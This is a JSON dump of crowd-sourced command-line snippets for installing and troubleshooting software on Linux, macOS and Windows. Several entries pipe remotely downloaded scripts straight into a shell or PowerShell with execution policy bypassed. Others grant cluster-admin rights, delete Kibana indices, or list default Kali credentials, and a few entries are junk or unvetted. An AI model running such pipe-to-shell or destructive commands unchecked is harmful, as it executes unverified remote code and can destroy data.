    "description": "1. install chocolate on your computer --- 1. open powershell using 'RUN AS ADMINISTRATOR' --- 2. Paste the 'follow' and 'run'  Set-ExecutionPolicy Bypass -Scope Process -Force; `   iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))  --- 3. Close and Reopen powershell  2. install youtube-dl using choco --- 1. choco install youtube-dl --- 2. enter 'a' and press enter for any prompts --- 3. choco install ffmpeg --- 4. enter 'a' and press enter for any prompts  3. open 'cmd' and use 'youtube-dl' --- 1. to download a single video ------>  youtube-dl -ciw -f mp4 https://www.youtube.com/watch?v=dQw4w9WgXcQ -o \"%(title)s.%(ext)s\" --- 2. to download a playlist ------>  youtube-dl -ciw -f mp4 https://www.youtube.com/playlist?list=PLv3TTBr1W_9tppikBxAE_G6qjWdBljBHJ -o \"%(playlist_index)s %(title)s.%(ext)s\" --- 3. to extract audio from video ------>  youtube-dl -ciw --extract-audio --audio-format mp3 --audio-quality 0 https://www.youtube.com/watch?v=dQw4w9WgXcQ -o \"%(title)s.%(ext)s\"\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3126,
    "keyword": null,
    "link": null,
    "title": " install yum terminal",
    "description": "sudo apt-get install yum\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3127,
    "keyword": null,
    "link": null,
    "title": " install zlib ubuntu",
    "description": "sudo apt install zlib1g sudo apt-get install zlib1g-dev\n$ sudo apt install zlib1g \n",
    "reg_date": "2021-10-11T22:08:57.000Z"
  },
  {
    "id": 3128,
    "keyword": null,
    "link": null,
    "title": " install zsh debian",
    "description": "$ sudo apt-get install zsh $ sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" \n$ sudo apt-get install zsh $ zsh --version \n",
    "reg_date": "2021-10-11T22:08:57.000Z"
  },
  {
    "id": 3129,
    "keyword": null,
    "link": null,
    "title": " installation directory must be on local hard drive",
    "description": "msiexec /i \"c:\\AnyPath\\YourInstaller.msi\"\nmsiexec /i \"c:\\AnyPath\\YourInstaller.msi\" WIXUI_DONTVALIDATEPATH=\"1\"\n",
    "reg_date": "2021-10-11T22:08:57.000Z"
  },
  {
    "id": 3130,
    "keyword": null,
    "link": null,
    "title": " installed python 3.8 but where is pip",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python3.8 get-pip.py \n",
    "reg_date": "2021-10-11T22:08:57.000Z"
  },
  {
    "id": 3131,
    "keyword": null,
    "link": null,
    "title": " installer pip3 linux",
    "description": "sudo apt install python3-pip\n",
    "reg_date": "2021-10-11T22:08:57.000Z"
  },
  {
    "id": 3132,
    "keyword": null,
    "link": null,
    "title": " installing  ncurses library",
    "description": "#installing the ncurses sudo apt-get install libncurses5-dev libncursesw5-dev\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3133,
    "keyword": null,
    "link": null,
    "title": " installing codeblocks in linux",
    "description": "sudo apt-get install codeblocks\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3134,
    "keyword": null,
    "link": null,
    "title": " installing eslint globally",
    "description": "npm install -g eslint \n$ npm install eslint --save-dev $ ./node_modules/.bin/eslint --init\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3135,
    "keyword": null,
    "link": null,
    "title": " installing firefox on debian",
    "description": "$ wget -O FirefoxSetup.tar.bz2 \"https://download.mozilla.org/?product=firefox-latest&os=linux64&lang=en-US\" \n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3136,
    "keyword": null,
    "link": null,
    "title": " installing freeswitch mod spy using apt-get",
    "description": "apt-get update && apt-get install freeswitch-mod-spy --fix-missing\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3137,
    "keyword": null,
    "link": null,
    "title": " installing g++ on ubuntu",
    "description": "$ sudo apt-get install g++\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3138,
    "keyword": null,
    "link": null,
    "title": " installing git in ec2",
    "description": "sudo yum install git -y\nsudo yum update -y sudo yum install git -y\n",
    "reg_date": "2021-10-11T22:08:58.000Z"
  },
  {
    "id": 3139,
    "keyword": null,
    "link": null,
    "title": " installing git on ec2",
    "description": "#Create an EC2 instance with Amazon Linux 2 with internet access #Connect to your instance using putty   #Perform a quick update on your instance: sudo yum update -y   #Install git in your EC2 instance sudo yum install git -y   #Check git version git version\n$ sudo yum install git\nsudo yum install git -y\nsudo yum update -y sudo yum install git -y\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3140,
    "keyword": null,
    "link": null,
    "title": " installing helm and tiller on minikube",
    "description": "#installing helm curl https://raw.githubusercontent.com/kubernetes/helm/master/scripts/get > install-helm.sh bash install-helm.sh  #Create the Tiller service account kubectl create serviceaccount tiller --namespace kube-system #Bind the Tiller service account to the cluster-admin role kubectl create clusterrolebinding tiller --clusterrole cluster-admin --serviceaccount=kube-system:tiller #initialisr helm with service account \"tiller\" helm init --service-account tiller  #sharing YAML file to bind tiller service account to cluster-admin role #Yo can use this YAML file if you do not want to do binding with command # and want to know further. kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata:   name: tiller-clusterrolebinding subjects: - kind: ServiceAccount   name: tiller   namespace: kube-system roleRef:   kind: ClusterRole   name: cluster-admin   apiGroup: \"\"\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3141,
    "keyword": null,
    "link": null,
    "title": " installing helm v2 and tiller on minikube",
    "description": "#installing helm curl https://raw.githubusercontent.com/kubernetes/helm/master/scripts/get > install-helm.sh bash install-helm.sh  #Create the Tiller service account kubectl create serviceaccount tiller --namespace kube-system #Bind the Tiller service account to the cluster-admin role kubectl create clusterrolebinding tiller --clusterrole cluster-admin --serviceaccount=kube-system:tiller #initialisr helm with service account \"tiller\" helm init --service-account tiller  #sharing YAML file to bind tiller service account to cluster-admin role #Yo can use this YAML file if you do not want to do binding with command # and want to know further. kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata:   name: tiller-clusterrolebinding subjects: - kind: ServiceAccount   name: tiller   namespace: kube-system roleRef:   kind: ClusterRole   name: cluster-admin   apiGroup: \"\"\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3142,
    "keyword": null,
    "link": null,
    "title": " installing hinterland for jupyter without anaconda",
    "description": "STEP 1: Open cmd prompt and run the following commands  1) pip install jupyter_contrib_nbextensions  2) pip install jupyter_nbextensions_configurator  3) jupyter contrib nbextension install --user   4) jupyter nbextensions_configurator enable --user  STEP 3: Open jupyter notebook  - click on nbextensions tab  - unckeck disable configuration for nbextensions without explicit compatibility  - put a check on Hinterland step 3: Open new python file and check autocomplete feature\njupyter contrib nbextension install --user \n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3143,
    "keyword": null,
    "link": null,
    "title": " installing isomorphic-fetch and simply doing",
    "description": "npm install --save isomorphic-fetch\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3144,
    "keyword": null,
    "link": null,
    "title": " installing java on linux",
    "description": "# install default JDK sudo apt install default-jdk # install default JRE sudo apt install default-jre # install specific JDK version sudo apt install openjdk-17-jdk # install specific JRE version sudo apt install openjdk-17-jre\n// for debian & debian based linux distributions \tsudo su or su -   \techo \"deb http://ppa.launchpad.net/linuxuprising/java/ubuntu focal main\" | tee /etc/apt/sources.list.d/linuxuprising-java.list     apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 73C3DB2A     apt-get update     Ctrl + D or exit // for Ubuntu, Linux Mint, Pop!_OS or Zorin Os \tsudo add-apt-repository ppa:linuxuprising/java     sudo apt update      // Now you can install Oracle JDK 16 on Debian / Ubuntu and Linux distributions based on these: \t//Install and make Oracle JDK 16 the default JDK version: \t\tsudo apt install oracle-java16-installer --install-recommends     //Install but don't make Oracle JDK 16 the default JDK version: \t\tsudo apt install oracle-java16-installer --no-install-recommends          //To check which Java version is set as default on your system \tjava -version or javac -version  //To accept the Oracle Java 16 license automatically \techo oracle-java16-installer shared/accepted-oracle-license-v1-2 select true | sudo /usr/bin/debconf-set-selections     \t//If that doesn't work, also try this command:     echo oracle-java16-installer shared/accepted-oracle-licence-v1-2 boolean true | sudo /usr/bin/debconf-set-selections\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3145,
    "keyword": null,
    "link": null,
    "title": " installing pip in ubuntu",
    "description": "sudo apt install python3-pip\napt upgrade && apt update apt install python3 python3 -m pip install -U pip   # OR sudo apt install python3-pip python3 -m pip --version pip --version\n#First enter the following command to the terminal @pip3 --version # after that @if it doesnt give a result like pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) # enter the following commands sudo apt install python3-pip sudo apt install python3-pip3 #Thats all #Ranuga D\nsudo apt update sudo apt install python2\npython-pip\nsudo python2 get-pip.py\n",
    "reg_date": "2021-10-11T22:08:59.000Z"
  },
  {
    "id": 3146,
    "keyword": null,
    "link": null,
    "title": " installing pm2 on linux",
    "description": "$ sudo npm i -g pm2  \nnpm install pm2 -g\n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3147,
    "keyword": null,
    "link": null,
    "title": " installing pytorch",
    "description": "pip install torch==1.8.1+cu102 torchvision==0.9.1+cu102 torchaudio===0.8.1 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.0 -c pytorch\nconda install pytorch torchvision -c pytorch \nNOTE: Python 3.9 users will need to add '-c=conda-forge' for installationconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nThe best way is going to pytorch official website and coping the code presented since it gives the best version according to your systems requirements\n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3148,
    "keyword": null,
    "link": null,
    "title": " installing react react-dom and react-scripts with cra-template has failed",
    "description": "npm cache clean --force\nrun npm cache clean --force and try again\n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3149,
    "keyword": null,
    "link": null,
    "title": " installing react router dom with yarn",
    "description": "npm install react-router-dom\n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3150,
    "keyword": null,
    "link": null,
    "title": " installing redis on mac",
    "description": "//Using Homebrew it is quite easy to install-  brew update brew install redis //To check  redis-cli ping //if you are getting PONG Then you are good to go(y)\n// use this command   redis-server  redis-cli \nbrew update brew install redis \nbrew services start redis \nbrew services stop redis \n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3151,
    "keyword": null,
    "link": null,
    "title": " installing rspec gemfile",
    "description": "source 'https://rubygems.org'   gem 'rspec'  #inside the Gemfile \n",
    "reg_date": "2021-10-11T22:09:00.000Z"
  },
  {
    "id": 3152,
    "keyword": null,
    "link": null,
    "title": " installing star aligner in macOS",
    "description": "STAR-master/bin/MacOSX_x86_64 export PATH=$PATH:/path/to/STAR-master/bin/MacOSX_x86_64 like export PATH=$PATH:/Users/rashidminhas/STAR-2.7.6a/bin/MacOSX_x86_64 It will work perfectly\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3153,
    "keyword": null,
    "link": null,
    "title": " installing zoom on ubuntu 20.04",
    "description": "wget https://zoom.us/client/latest/zoom_amd64.deb  sudo apt install ./zoom_amd64.deb\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3154,
    "keyword": null,
    "link": null,
    "title": " instamm webpack 4.42.0 how with command",
    "description": "npm install --save-dev webpack # or specific version npm install --save-dev webpack@<version>\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3155,
    "keyword": null,
    "link": null,
    "title": " intall teams on ubuntu",
    "description": "#option1 wget https://packages.microsoft.com/repos/ms-teams/pool/main/t/teams/teams_1.3.00.5153_amd64.deb sudo apt install ./teams_1.3.00.5153_amd64.deb  #option2 curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - echo \"deb [arch=amd64] https://packages.microsoft.com/repos/ms-teams stable main\" > /etc/apt/sources.list.d/teams.list apt update apt install teams \n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3156,
    "keyword": null,
    "link": null,
    "title": " interface graphique sur python",
    "description": "sudo apt-get install python3-tk \nsudo apt-get install python-tk \n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3157,
    "keyword": null,
    "link": null,
    "title": " internet speed test terminal",
    "description": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - \nsudo apt install speedtest-cli\npip install --user speedtest-cli\n$ speedtest Retrieving speedtest.net configuration... Testing from CenturyLink (65.128.194.58)... Retrieving speedtest.net server list... Selecting best server based on ping... Hosted by CenturyLink (Cambridge, UK) [20.49 km]: 31.566 ms Testing download speed................................................................................ Download: 68.62 Mbit/s Testing upload speed...................................................................................................... Upload: 10.93 Mbit/s\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3158,
    "keyword": null,
    "link": null,
    "title": " invalid command bdist wheel",
    "description": "pip install wheel \nHow to fix `error: invalid command &lsquo;bdist_wheel&rsquo;`?\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3159,
    "keyword": null,
    "link": null,
    "title": " ionic.ps1 is not digitally signed.",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:09:01.000Z"
  },
  {
    "id": 3160,
    "keyword": null,
    "link": null,
    "title": " ionic 4 install bootstrap",
    "description": "npm install bootstrap@latest  \"styles\": [           {             \"input\": \"src/theme/variables.scss\"           },           {             \"input\": \"src/global.scss\"           },           {             \"input\": \"node_modules/bootstrap/dist/css/bootstrap.min.css\"           } ],\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3161,
    "keyword": null,
    "link": null,
    "title": " ionic capacitor build livereload",
    "description": "ionic cap run ios -l --external\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3162,
    "keyword": null,
    "link": null,
    "title": " ionic capacitor ios live reload",
    "description": "ionic cap run android -l --external\nionic cap run ios -l --external\nnpx cap open ios\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3163,
    "keyword": null,
    "link": null,
    "title": " ionic capcitor v3 geolocation install",
    "description": "npm install @capacitor/geolocation npx cap sync\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3164,
    "keyword": null,
    "link": null,
    "title": " ionic cli",
    "description": "$ npm install -g @ionic/cli\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3165,
    "keyword": null,
    "link": null,
    "title": " ionic cordova live reload",
    "description": "ionic cordova run android -l\n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3166,
    "keyword": null,
    "link": null,
    "title": " ionic install",
    "description": "$ npm install -g @ionic/cli\nnpm install -g @ionic/cli\nTo go git bash or command prompt and type the following: \tnpm install -g @ionic/cli  To install Cordova and Ionic, use  \tnpm install -g ionic cordova\n$ ionic cordova plugin add integrator-cordova-plugin-downloader $ npm install --save @ionic-native/downloader@4 \n",
    "reg_date": "2021-10-11T22:09:02.000Z"
  },
  {
    "id": 3167,
    "keyword": null,
    "link": null,
    "title": " ionic install 3.19.0",
    "description": "$ npm install -g @ionic/cli\n",
    "reg_date": "2021-10-11T22:09:03.000Z"
  },
  {
    "id": 3168,
    "keyword": null,
    "link": null,
    "title": " ionic install copycliboard",
    "description": "# capacitor: npm install cordova-clipboard npm install @ionic-native/clipboard ionic cap sync\n",
    "reg_date": "2021-10-11T22:09:03.000Z"
  },
  {
    "id": 3169,
    "keyword": null,
    "link": null,
    "title": " ionic plugin list command",
    "description": "cordova plugin list\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3170,
    "keyword": null,
    "link": null,
    "title": " ip address ubuntu",
    "description": "ip address show\n# when you're on your terminal Window :  ipconfig  # on macOS :  ifconfig | grep \"inet\" | grep -v 127.0.0.1  # on Linux :   hostname -I\nOpen your command prompt and type following command shown below and press enter  ifconfig -a\ncurl ifconfig.me\n$ systemd-resolve --status | grep Current \nip a\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3171,
    "keyword": null,
    "link": null,
    "title": " ip on mac",
    "description": "ifconfig | grep \"inet \"\nUse for wireless ipconfig getifaddr en1 or for ethernet ipconfig getifaddr en0  ipconfig getifaddr en0 is default for wifi interface.\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3172,
    "keyword": null,
    "link": null,
    "title": " ipconfig in ubantu",
    "description": "The Ubuntu/Linux equivalent of ipconfig in Windows is ifconfig.  Try typing sudo ifconfig.\nip addr\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3173,
    "keyword": null,
    "link": null,
    "title": " iphone is disconnecting continuously from mac",
    "description": "sudo killall -STOP -c usbd\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3174,
    "keyword": null,
    "link": null,
    "title": " iptables list ubuntu",
    "description": "sudo iptables -L --line-numbers\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3175,
    "keyword": null,
    "link": null,
    "title": " is firewall running centos 7",
    "description": "systemctl start firewalld\nsystemctl status firewalld\n",
    "reg_date": "2021-10-11T22:09:04.000Z"
  },
  {
    "id": 3176,
    "keyword": null,
    "link": null,
    "title": " is linux bad",
    "description": "NO NO NO NO ITS FLIPPING AWESOME\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3177,
    "keyword": null,
    "link": null,
    "title": " is lubuntu better than ubuntu",
    "description": "Lubuntu is much faster than Ubuntu is.\n Lubuntu uses LXDE while Ubuntu uses Unity as the default DE\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3178,
    "keyword": null,
    "link": null,
    "title": " is not digitally signed. you cannot run this script on the current system",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3179,
    "keyword": null,
    "link": null,
    "title": " iterm ftp command not found",
    "description": "brew install inetutils\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3180,
    "keyword": null,
    "link": null,
    "title": " jango.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module",
    "description": "sudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient  #for Debian su apt install libmysqlclient-dev su apt install libssl-dev pip install mysqlclient\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3181,
    "keyword": null,
    "link": null,
    "title": " jasmine.clock().install() jest",
    "description": "jest.useFakeTimers()\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3182,
    "keyword": null,
    "link": null,
    "title": " java.lang.IllegalStateException: Dex archives: setting .DEX extension only for .CLASS files",
    "description": "./gradlew clean  #or for cordova developers cordova clean\n",
    "reg_date": "2021-10-11T22:09:05.000Z"
  },
  {
    "id": 3183,
    "keyword": null,
    "link": null,
    "title": " java 8 install ubuntu",
    "description": "sudo apt-get install openjdk-8-jdk\nsudo apt install default-jdk \n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3184,
    "keyword": null,
    "link": null,
    "title": " java change version mac",
    "description": "/usr/libexec/java_home -V # Matching Java Virtual Machines (2): #    16.0.1, x86_64:     \"Java SE 16.0.1\" #    11.0.11.1, x86_64:  \"Amazon Corretto 11\" #    \t ^ #        | #     VERSION export JAVA_HOME=`/usr/libexec/java_home -v [VERSION]`\nnano ~/.zshrc  export JAVA_HOME=$(/usr/libexec/java_home -v 1.8.0) \n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3185,
    "keyword": null,
    "link": null,
    "title": " java check java version",
    "description": "java -version  #for jre version javac -version  # for java compiler version  \n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3186,
    "keyword": null,
    "link": null,
    "title": " java check jre version",
    "description": "java -version  #for jre version javac -version  # for java compiler version  \n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3187,
    "keyword": null,
    "link": null,
    "title": " jest vscode autocomplete",
    "description": "npm install @types/jest\n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3188,
    "keyword": null,
    "link": null,
    "title": " jscore",
    "description": "npm install jscore \n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3189,
    "keyword": null,
    "link": null,
    "title": " julia install linux",
    "description": "# How does the last version Julia install in Ubuntu 16.04 or above?  # Wget Magic # Copy and paste on your favorite linux console :) cd ~/Downloads && wget -q -O- https://julialang.org/downloads/ | grep -Po '(?<=href=\")[^\"]*' | grep https://julialang-s3.julialang.org/bin/linux/x64/ | head -1 | xargs wget -O julia-x86_64.tar.gz && mkdir julia-x86_64 && tar -xvzf julia-x86_64.tar.gz -C julia-x86_64 --strip-components 1 && sudo cp -r julia-x86_64 /opt/ && sudo ln -s /opt/julia-x86_64/bin/julia /usr/local/bin/julia && julia\nsudo apt-get update -y sudo apt-get install -y julia  julia\n# Windows choco install julia --confirm  # Mac brew cask install julia  # Debian/Ubuntu sudo apt install julia\n",
    "reg_date": "2021-10-11T22:09:06.000Z"
  },
  {
    "id": 3190,
    "keyword": null,
    "link": null,
    "title": " jupyter notebook venv",
    "description": "python -m ipykernel install --user --name=myenv \n$ python -m venv projectname $ source projectname/bin/activate (venv) $ pip install ipykernel (venv) $ ipython kernel install --user --name=projectname \n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3191,
    "keyword": null,
    "link": null,
    "title": " jupyter uninstall",
    "description": "jupyter kernelspec uninstall unwanted-kernel\npython3 -m pip uninstall -y jupyter jupyter_core jupyter-client jupyter-console jupyterlab_pygments notebook qtconsole nbconvert nbformat \n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3192,
    "keyword": null,
    "link": null,
    "title": " k8 svc url",
    "description": "<service-name>.<namespace>.svc.cluster.local:<service-port>\n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3193,
    "keyword": null,
    "link": null,
    "title": " k8s create namespace",
    "description": "# cli kubectl create ns test-namespace  # or in yaml --- apiVersion: v1 kind: Namespace metadata:   name: test-namespace\n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3194,
    "keyword": null,
    "link": null,
    "title": " kahoot",
    "description": "rew 434 234324 asdsad asdasdsa dasd sad\nasdsad\nKahoooooot\n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3195,
    "keyword": null,
    "link": null,
    "title": " kali",
    "description": "Kali is great for learning ethical hacking\nwelcome to our hack team\nOoga booga\nI'ts more fast than ubuntu and windows\ni see you gonna hack?\necho Hacking?\n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3196,
    "keyword": null,
    "link": null,
    "title": " kali an installation step failed select and install software",
    "description": "//Skip the step \"Select and install software\" and perform next step which is GRUB installation. Once installation is complete, login to single user mode and run following commands.  sudo apt-get install kali-desktop-xfce sudo apt-get install kali-linux-default\n",
    "reg_date": "2021-10-11T22:09:07.000Z"
  },
  {
    "id": 3197,
    "keyword": null,
    "link": null,
    "title": " kali find devices on network",
    "description": "# change the network as yours nmap -sn 192.168.1.0/24\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3198,
    "keyword": null,
    "link": null,
    "title": " kali linux desktop gadgets",
    "description": "## desktop gadget Screenlets sudo apt-get install screenlets screenlets-pack-all\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3199,
    "keyword": null,
    "link": null,
    "title": " kali linux keeps booting into grub",
    "description": "If you are in grub rescue mode, then run these commands to reconfigure grub:  ls set root=(hd0,gptx) set prefix=(hd0,gptx)/boot/grub insmod normal normal  ls(LS) lists all the partitions of your hard drive like this (hd0) (hd0,gpt1) (hd0,gpt2). You can make some guesses which one is your kali filesystem to replace the variable x in gptx.  Once you boot into kali open terminal and type:  grub-install /dev/sda update-initramfs -u update-grub\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3200,
    "keyword": null,
    "link": null,
    "title": " kali linux renew ip address",
    "description": "$ sudo dhclient -r $ sudo dhclient\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3201,
    "keyword": null,
    "link": null,
    "title": " kali linux update all",
    "description": "sudo apt full-upgrade -y\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3202,
    "keyword": null,
    "link": null,
    "title": " kali linux upgrade to new version",
    "description": "sudo apt update && sudo apt full-upgrade -y\nsudo apt-get update  sudo apt-get upgrade\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3203,
    "keyword": null,
    "link": null,
    "title": " kali password",
    "description": "Default credentials: User: kali Password: kali\n",
    "reg_date": "2021-10-11T22:09:08.000Z"
  },
  {
    "id": 3204,
    "keyword": null,
    "link": null,
    "title": " kazam install ubuntu",
    "description": "sudo add-apt-repository ppa:sylvain-pineau/kazam sudo apt-get update sudo apt-get install kazam kazam -v # to check the version of kazam\nsudo apt update sudo apt install kazam\n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3205,
    "keyword": null,
    "link": null,
    "title": " kibana server is not ready yet",
    "description": "//First solution curl --request DELETE 'https://elastic-search-host:9200/.kibana*' sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service    //Second solution //edit this file: /etc/elasticsearch/elasticsearch.yml //uncomment: #network.host: localhost  //edit this file: /etc/kibana/kibana.yml //uncomment: #elasticsearch.hosts: [\"http://localhost:9200\"]  //restart elascticsearch and kibana service sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service \n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3206,
    "keyword": null,
    "link": null,
    "title": " kibana server is not ready yet centos 8",
    "description": "//First solution curl --request DELETE 'https://elastic-search-host:9200/.kibana*' sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service    //Second solution //edit this file: /etc/elasticsearch/elasticsearch.yml //uncomment: #network.host: localhost  //edit this file: /etc/kibana/kibana.yml //uncomment: #elasticsearch.hosts: [\"http://localhost:9200\"]  //restart elascticsearch and kibana service sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service \n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3207,
    "keyword": null,
    "link": null,
    "title": " kibana server is not ready yet macos",
    "description": "//First solution curl --request DELETE 'https://elastic-search-host:9200/.kibana*' sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service    //Second solution //edit this file: /etc/elasticsearch/elasticsearch.yml //uncomment: #network.host: localhost  //edit this file: /etc/kibana/kibana.yml //uncomment: #elasticsearch.hosts: [\"http://localhost:9200\"]  //restart elascticsearch and kibana service sudo systemctl restart elasticsearch.service  sudo systemctl restart kibana.service \n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3208,
    "keyword": null,
    "link": null,
    "title": " kill a port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nkill -9 $(sudo lsof -t -i:8080) \nnpx kill-port 3000 \nkill $(lsof -ti:3000) \nkill $(lsof -t -i:8080) //kill port 8080\n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3209,
    "keyword": null,
    "link": null,
    "title": " kill a port process in ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\n",
    "reg_date": "2021-10-11T22:09:09.000Z"
  },
  {
    "id": 3210,
    "keyword": null,
    "link": null,
    "title": " kill a port windows",
    "description": "netstat -ano | findstr :3001 taskkill /PID <yourid> /F\nnpx kill-port 8080 \nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\nnetstat -ano | findstr :8080 taskkill /PID <yourid> /F\nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID <ID_HERE> /f  //can be found on the last column next to LISTENING ____________________________________________________________________________  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       24660 ____________________________________________________________________________  !! taskkill /PID 24660 /f \nnetstat -ano | findstr :<PORT> taskkill //PID <PID> //F OR taskkill /PID <PID> /F\n",
    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3211,
    "keyword": null,
    "link": null,
    "title": " kill a process on Ubuntu",
    "description": "sudo kill -9 $(sudo lsof -t -i:9001) \npidof slack  9734 9718 9716 9708 9622 9619 sudo kill -9 process_id  pidof apt  9734 9718 9716 9708 9622 9619 sudo kill -9 9734 9718 9716 9708 9622 9619  \nsudo kill -9 process_id\nps -ax | grep application name \n",
    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3212,
    "keyword": null,
    "link": null,
    "title": " kill a process on a port ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:9001`\nsudo lsof -t -i:9001\n",
